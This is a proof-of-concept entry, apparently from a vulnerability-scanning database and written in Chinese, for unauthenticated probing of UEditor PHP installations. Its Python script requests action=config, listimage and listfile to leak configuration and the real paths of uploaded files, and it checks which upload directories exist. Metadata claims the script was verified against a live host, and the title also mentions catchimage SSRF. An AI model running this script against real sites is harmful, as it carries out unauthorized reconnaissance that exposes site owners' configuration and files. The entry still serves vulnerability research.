# UEditor PHP 零鉴权面盲探（config 泄露 / listimage 路径枚举 / upload 目录存在性 / catchimage SSRF）

- **code**: ueditor-php-零鉴权面盲探-config-泄露-listimage-路径枚举-upload-目录存在性-catchimage-ssrf
- **kind**: poc
- **category**: unauthorized
- **component**: UEditor (PHP)
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-13 在 203.0.113.100 / Host: example.com 上实测（零 Cookie，直连 80）：action=config → 200/1200B（完整 JSON）；action=listimage → 200/1500B；action=listfile → 200/588B，返回 /ueditor/php/upload/file/20260921/178...；/ueditor/php/upload/{image,file,video}/ 均 403（存在）。无需任何认证。
- **path**: pocs/ueditor-php-零鉴权面盲探-config-泄露-listimage-路径枚举-upload-目录存在性-catchimage-ssrf/ueditor_probe.py
- **tags**: ueditor,unauthorized,file-upload,mkdir,ssrf,thinkphp
- **created_at**: 2026-10-13T11:35:48.371Z
- **found_by**: vuln-scan

## 描述

UEditor PHP 零鉴权面盲探：action=config 泄露配置、listimage/listfile 泄露全站上传文件真实路径、/ueditor/php/upload/*/ 403 证明零凭证 mkdir(0777,true) 已执行。

## 用法

```
python ueditor_probe.py  （改 TARGET_IP / TARGET_HOST）
真实路径按部署调整：/Public/admin/ueditor/php/controller.php 或 /ueditor/php/controller.php
仅 GET；不触发写。写入测试（uploadscrawl / uploadfile）会产生真实文件，按需另做。
```

## 正文

```
#!/usr/bin/env python3
# 盲探 UEditor 零鉴权面（纯 GET，不写任何数据）
import http.client, sys

def probe(ip, host, path, timeout=12):
    c = http.client.HTTPConnection(ip, 80, timeout=timeout)
    c.request("GET", path, headers={"Host": host, "User-Agent": "Mozilla/5.0", "Connection": "close"})
    r = c.getresponse(); b = r.read(1500); c.close()
    return r.status, len(b), b.decode('utf-8', 'replace')

IP, HOST = "TARGET_IP", "TARGET_HOST"
BASE = "/Public/admin/ueditor/php/controller.php"
for act in ("config", "listimage", "listfile"):
    st, ln, body = probe(IP, HOST, "%s?action=%s" % (BASE, act))
    print("[%s] %s len=%d %s" % (act, st, ln, body[:160]))
for d in ("/ueditor/", "/ueditor/php/", "/ueditor/php/upload/image/", "/ueditor/php/upload/file/"):
    st, ln, _ = probe(IP, HOST, d)
    print("[dir] %-34s %s  %s" % (d, st, "存在(403=禁列目录)" if st == 403 else ("不存在" if st == 404 else "?")))
print("其他路径：/Public/admin/ueditor/php/config.json（直读配置）")

```
